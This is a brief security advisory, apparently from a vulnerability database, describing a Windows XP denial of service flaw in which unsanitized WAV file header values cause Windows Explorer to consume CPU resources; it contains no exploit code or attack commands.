Microsoft Windows XP is reported prone to a denial of service vulnerability. The issue exists due to a lack of sufficient sanitization performed on WAV file header values before they are processed.

If an exploit attempt is successful, the Windows Explorer process will begin to consume CPU resources. An attacker may exploit this vulnerability to deny service to legitimate users.
